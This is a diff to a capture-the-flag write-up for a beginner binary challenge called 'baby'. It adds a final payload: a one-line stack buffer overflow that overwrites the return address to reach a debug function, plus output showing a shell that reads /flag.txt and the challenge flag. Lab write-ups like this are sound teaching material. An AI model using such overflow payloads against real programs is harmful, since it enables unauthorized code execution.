@@ -229,3 +229,19 @@ gdb.attach(c)
 c.sendline(b"a" * 22 + (0x08049205).to_bytes(4, 'little'))
 c.interactive()
 ```
+
+## Final payload
+
+```bash
+(python3 -c "from sys import stdout;stdout.buffer.write(b'a' * 22 + (0x08049205).to_bytes(4, 'little') + b'\n')"; cat) | ./baby
+```
+
+```
+... [ASCII ARTS TRUNCATED]
+Fill this : New is not always ...?
+AAAAAAAAAAAAAAAAAAAAAA ? The good one is the following one : 
+New is not always better ! But sometimes, it is ;)
+Debug mode enabled
+cat /flag.txt   
+GH{m4yb3_th1S_Is_y0uR_f1rsT_biN4ry_pWn3d}
+```
